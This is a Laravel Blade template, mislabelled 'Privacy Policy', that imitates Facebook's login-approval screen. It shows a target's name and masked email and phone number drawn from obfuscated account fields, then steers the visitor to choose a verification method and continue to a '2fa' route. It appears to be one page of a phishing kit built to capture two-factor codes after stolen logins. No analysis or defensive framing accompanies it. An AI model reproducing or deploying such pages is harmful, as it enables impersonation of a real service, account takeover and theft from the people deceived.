@extends('layouts.main')

@section('title', 'Privacy Policy')

@section('content')
    <div class="bg-[#F1F2F6] flex justify-center items-center h-screen">
        <div class="sm:w-11/12 md:w-2/3 lg:w-2.5/5 xl:w-2/5 w-11/12 mx-auto rounded-lg p-5 bg-[#fff] self-center">
            <p class="font-semibold text-gray-500 mb-3">{{ $account->rcuarvklkut }} • Facebook</p>
            <p class="font-bold text-2xl">Check your notifications on another device</p>
            <p class="my-3">Go to your Facebook account on another device and open the notifications we send to approve
                this login.
            </p>
            <img src="{{ asset('assets/images/mAxG9RK.jpg') }}" class="w-full h-[260px] object-cover mx-auto rounded-sm">
            <div class="p-3 flex items-center gap-3 bg-[#F7F8FA] rounded-md my-3">
                <div class="text-2xl text-yellow-600">
                    <ion-icon name="notifications-circle-outline"></ion-icon>
                </div>
                <div>
                    <p class="font-semibold">Waiting for approval</p>
                    <p>It may take a few minutes to get the notification on your other device. Get a new notification.
                    </p>
                </div>
            </div>
            <button data-modal-target="confirmModal" data-modal-toggle="confirmModal"
                class="block text-base cursor-pointer bg-gray-100 border border-[#d1d5db] hover:bg-blue-800 transition ease-in-out delay-75 hover:text-white w-full font-semibold text-center py-3 text-black rounded-2xl">Try
                another way</button>
        </div>
    </div>
    <div id="confirmModal" data-modal-backdrop="static" tabindex="-1" aria-hidden="true"
        class="fixed top-0 left-0 right-0 z-50 hidden w-full p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[calc(100%-1rem)] max-h-full">
        <div class="relative w-full max-w-xl max-h-full">
            <!-- Modal content -->
            <div class="relative bg-white rounded-lg shadow">
                <!-- Modal header -->
                <div class="flex items-start justify-between p-2 rounded-t">
                    <button type="button"
                        class="text-gray-400 bg-transparent hover:bg-gray-200 hover:text-gray-900 rounded-lg text-sm w-8 h-8 ms-auto inline-flex justify-center items-center dark:hover:bg-gray-600 dark:hover:text-white"
                        data-modal-hide="confirmModal">
                        <svg class="w-3 h-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none"
                            viewBox="0 0 14 14">
                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6" />
                        </svg>
                        <span class="sr-only">Close modal</span>
                    </button>
                </div>
                <!-- Modal body -->
                <div class="py-2 px-6">
                    <p class="text-xl font-bold my-3">Choose a way to confirm that it's you</p>
                    <ul class="space-y-1 text-sm text-gray-700 mt-3">
                        <li class="cursor-pointer rounded-lg overflow-hidden bg-gray-200">
                            <div class="flex justify-between py-2 pl-2 pr-4 items-center hover:bg-gray-200">
                                <label for="helper-radio-4" class="w-full ms-2 font-semibold text-gray-900">
                                    <div class="text-base">Notification on another device</div>
                                    <p id="helper-radio-text-4" class="text-base font-normal text-gray-500">Approve the login from another device.</p>
                                </label>
                                <div class="flex items-center h-5">
                                    <input
                                        onchange="this.checked 
                                    ? (this.parentNode.parentNode.parentNode.parentNode.querySelectorAll('li').forEach(item => item.classList.remove('bg-gray-200')),
                                    this.parentNode.parentNode.parentNode.classList.add('bg-gray-200'))
                                    : ''"
                                        checked id="helper-radio-4" name="helper-radio" type="radio" value=""
                                        class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-700 dark:focus:ring-offset-gray-700 focus:ring-2 dark:bg-gray-600 dark:border-gray-500">
                                </div>
                            </div>
                        </li>
                        <li class="cursor-pointer rounded-lg overflow-hidden">
                            <div class="flex justify-between py-2 pl-2 pr-4 items-center hover:bg-gray-200">
                                <label for="helper-radio-5" class="w-full ms-2 font-semibold text-gray-900">
                                    <div class="text-base">Email</div>
                                    <p id="helper-radio-text-4" class="text-base font-normal text-gray-500">We'll send a code to {{ hidden_string($account->xqdmbnlkpcq) }}.</p>
                                </label>
                                <div class="flex items-center h-5">
                                    <input
                                        onchange="this.checked 
                                    ? (this.parentNode.parentNode.parentNode.parentNode.querySelectorAll('li').forEach(item => item.classList.remove('bg-gray-200')),
                                    this.parentNode.parentNode.parentNode.classList.add('bg-gray-200'))
                                    : ''"
                                        id="helper-radio-5" name="helper-radio" type="radio" value=""
                                        class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-700 dark:focus:ring-offset-gray-700 focus:ring-2 dark:bg-gray-600 dark:border-gray-500">
                                </div>
                            </div>
                        </li>
                        <li class="cursor-pointer rounded-lg overflow-hidden">
                            <div class="flex justify-between py-2 pl-2 pr-4 items-center hover:bg-gray-200">
                                <label for="helper-radio-6" class="w-full ms-2 font-semibold text-gray-900">
                                    <div class="text-base">Text message</div>
                                    <p id="helper-radio-text-4" class="text-base font-normal text-gray-500">We'll send a code to {{ hidden_string($account->gpaciebmfzw) }}.</p>
                                </label>
                                <div class="flex items-center h-5">
                                    <input
                                        onchange="this.checked 
                                    ? (this.parentNode.parentNode.parentNode.parentNode.querySelectorAll('li').forEach(item => item.classList.remove('bg-gray-200')),
                                    this.parentNode.parentNode.parentNode.classList.add('bg-gray-200'))
                                    : ''"
                                        id="helper-radio-6" name="helper-radio" type="radio" value=""
                                        class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-700 dark:focus:ring-offset-gray-700 focus:ring-2 dark:bg-gray-600 dark:border-gray-500">
                                </div>
                            </div>
                        </li>
                    </ul>
                    <a href="{{ route('2fa', $account->id) }}"
                        class="text-white inline-flex w-full justify-center bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center my-10">
                        Continue
                    </a>
                </div>
            </div>
        </div>
    </div>
@endsection
